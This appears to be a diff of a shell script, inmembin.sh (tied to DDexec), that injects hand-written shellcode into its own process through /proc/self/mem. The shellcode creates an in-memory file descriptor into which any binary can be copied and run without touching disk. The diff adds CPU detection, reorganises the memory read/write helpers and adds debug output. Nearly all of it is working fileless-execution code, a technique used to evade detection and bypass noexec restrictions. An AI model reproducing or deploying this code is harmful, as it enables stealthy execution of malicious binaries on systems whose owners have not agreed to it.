@@ -6,14 +6,28 @@
 Ex: bash ./inmembin.sh & sleep 0.3; cp $(command which echo) /proc/$!/fd/4; /proc/$!/fd/4 toto
 '
 
+get_arch(){
+   : 'Print Cpu architecture: x86_64 or aarch64.
+     read -r INMEMBIN_ARCH < /proc/sys/kernel/arch  # Not working before 2022
+   '
+  while IFS=: read -r cpuinfo_key cpuinfo_value; do
+    case $cpuinfo_key in flags*)
+        case $cpuinfo_value in
+          *" lm "*|*lm$) printf %s x86_64;;
+          *" lpae "*|*lpae$) printf %s aarch64;;
+        esac
+    break;; esac
+  done < /proc/cpuinfo
+}
+
 # Global architecture
-: "${INMEMBIN_ARCH:=$(uname -m)}"  # x86_64 or aarch64
-: "${INMEMBIN_SOURCED:=0}"
-: "${INMEMBIN_DEBUG:=1}"
+: "${INMEMBIN_ARCH:=$(get_arch)}"  # x86_64 or aarch64
+: "${INMEMBIN_SOURCED:=0}"  # Is the file sourced, or executed?
+: "${INMEMBIN_DEBUG:=0}"  # Add debug symbols?
 
 # Clause: leave if CPU not supported
 case $INMEMBIN_ARCH in x86_64|aarch64):;; *)
-  echo "DDexec: Error, this architecture is not supported." >&2
+  echo "DDexec: Error, this architecture is not supported ($INMEMBIN_ARCH)" >&2
   exit 1;;
 esac
 
@@ -35,16 +49,18 @@ create_memfd(){
   # Craft jumper
   jumper_hex="$(craft_jumper "$shellcode_addr_dec")"
 
-  # Backup
-  shellcode_save_hex=$(read_mem "$shellcode_addr_dec" $(( ${#shellcode_hex} / 2 )))
-  #[ "$INMEMBIN_DEBUG" != 0 ] && >&2 echo Read2
+  # Backup jumper
   jumper_save_hex=$(read_mem "$jumper_addr_dec" $(( ${#jumper_hex} / 2 )))
-  # Expects: 483d00f0ffff7756c30f1f44
 
   # Craft shellcode
   shellcode_hex="$(craft_shellcode "$jumper_addr_dec" "$jumper_save_hex")"
 
+  # Backup shellcode
+  shellcode_save_hex=$(read_mem "$shellcode_addr_dec" $(( ${#shellcode_hex} / 2 )))
+  # Expects: 483d00f0ffff7756c30f1f44
+
   [ "$INMEMBIN_DEBUG" != 0 ] && >&2 echo "InMemBin:
+    pid=$$
     shellcode_addr_hex=$shellcode_addr_hex
     shellcode_hex=$shellcode_hex
     shellcode_save_hex=$shellcode_save_hex
@@ -62,16 +78,13 @@ create_memfd(){
 
   # Write jump instruction where it will be found shortly
   [ "$INMEMBIN_DEBUG" != 0 ] && >&2 echo "InMemBin: Write jumper"
-  #write_mem "$jumper_addr_dec" "$jumper_hex"
-  exec 3> /proc/self/mem
-  seek "$jumper_addr_dec" <&3
-  unhexify "$jumper_hex" >&3
+  write_mem "$jumper_addr_dec" "$jumper_hex"
   # -- Wait: Fd still not created at this point
 
   # Trigger
   [ "$INMEMBIN_DEBUG" != 0 ] && >&2 echo "InMemBin: Trigger"
-  if [ -n "$KSH_VERSION" ] || [ "$INMEMBIN_SOURCED" = 0 ]; then
-    read -r syscall_info < /proc/self/syscall
+  if [ -n "$KSH_VERSION" ]; then
+    :#read -r _syscall_info < /proc/self/syscall
   fi
 
   if [ -z "$KSH_VERSION" ]; then
@@ -87,17 +100,27 @@ read_mem(){
   : 'Read mem at pos (arg1) with size (arg2)
     TODO: Implementing... bash only
   '
-  exec 3< /proc/self/mem
-  dd bs=1 skip="$1" count="$2" <&3 2> /dev/null | hexify "$2" 2> /dev/null
-  exec 3<&-
+  >&2 echo "Tin: PID: $$"
+  >&2 ls -l /proc/$$/fd
+  exec 6< /proc/self/mem
+  >&2 ls -l /proc/$$/fd
+  dd bs=1 skip="$1" count="$2" <&6 2> /dev/null | hexify "$2" 2> /dev/null
+  exec 6<&-
 }
 
 
 write_mem(){
-  exec 3> /proc/self/mem
-  seek "$1" <&3
-  unhexify "$2" >&3
-  exec 3>&-
+  : 'Write meme at pos (arg1) content (arg2)'
+  exec 6> /proc/self/mem
+  seek "$1" <&6
+  unhexify "$2" >&6
+  exec 6>&-
+}
+
+
+seek(){
+  : 'Seek offset (arg1) on stdin => just to offset the FD'
+  dd bs=1 skip="$1" count=0 > /dev/null 2>&1
 }
 
 
@@ -122,7 +145,8 @@ craft_shellcode(){
       ## ORIGIN
       #out_sc="${out_sc}68444541444889e74831f64889f0b401b03f0f054889c7b04d0f05b0220f05";;  # memfd
 
-      ## Debug with jump
+      # suscall memfd 0x164
+      #out_sc="${out_sc}cd03"  # Debug
       out_sc="${out_sc}68444541444889e74831f64889f0b401b03f0f054889c7b04d"
       out_sc="${out_sc}5831c0"  # pop eax, xor eax, eax
       # memprotect + mov + jump back
@@ -132,8 +156,9 @@ craft_shellcode(){
       out_sc="${out_sc}49bf${jumper_addr_hex_endian}"
       # memprotect RW
       out_sc="${out_sc}b80a00000048bf${jumper_addr_hex_endian_page}ba03000000be000001000f05"
+      # 
       out_sc="${out_sc}41c707${save_dw1}41c74704${save_dw2}41c74708${save_dw3}"
-      # memptrotect RX
+      # memprotect RX
       out_sc="${out_sc}b80a00000048bf${jumper_addr_hex_endian_page}ba05000000be000001000f05"
       # Jump r15
       out_sc="${out_sc}41ffe7"
@@ -161,17 +186,17 @@ craft_jumper(){
 
 get_section_start_addr(){
   : 'Print offset of start of section with string (arg1)'
-  while read -r line; do
-    case $line in *"$1"*) printf "%s" "$line" | cut -d- -f1; break; esac
+  while IFS=- read -r section_addr_out section_rest; do
+    case "$section_rest" in *"$1"*) printf %s "$section_addr_out"; break; esac
   done < /proc/$$/maps
 }
 
 
 get_read_syscall_ret_addr(){
   : 'Print decimal addr where a next syscall will return, to put jumper, as trigger'
-  read -r syscall_info < /proc/self/syscall
-  out_ret="$(printf "%s" "$syscall_info" | cut -d' ' -f9)"
-  printf "%s" "${out_ret##??}"  # Remove the 0x prefix
+  #read -r syscall_info < /proc/self/syscall
+  IFS=' ' read -r _sys_nb _sys_a1 _sys_a2 _sys_a3 _sys_a4 _sys_a5 _sys_a6 _sys_sp sys_ret < /proc/self/syscall
+  printf "%s" "${sys_ret##??}"  # Remove the 0x prefix
 }
 
 
@@ -220,12 +245,6 @@ hex2dec(){
 }
 
 
-seek(){
-  : 'Seek offset (arg1) on stdin => just to offset the FD'
-  dd bs=1 skip="$1" count=0 > /dev/null 2>&1
-}
-
-
 # Is script sourced?  # From: https://stackoverflow.com/a/28776166/2544873
 if [ -n "$ZSH_VERSION" ]; then
   case $ZSH_EVAL_CONTEXT in *:file) INMEMBIN_SOURCED=1;; esac
@@ -233,7 +252,7 @@ elif [ -n "$BASH_VERSION" ]; then
   (return 0 2>/dev/null) && INMEMBIN_SOURCED=1
 else # All other shells: examine $0 for known shell binary filenames.
   # Detects sh and dash and ksh; add additional shell filenames as needed.
-  case ${0##*/} in sh|-sh|ash|-ash|dash|-dash|ksh|-ksh|ksh93|test_inmembin.sh) INMEMBIN_SOURCED=1;; esac
+  case ${0##*/} in sh|-sh|ash|-ash|dash|-dash|ksh|-ksh|ksh93|yash|test_inmembin.sh) INMEMBIN_SOURCED=1;; esac
 fi
 
 [ "$INMEMBIN_SOURCED" = 0 ] && { create_memfd; tail -f /dev/null; }
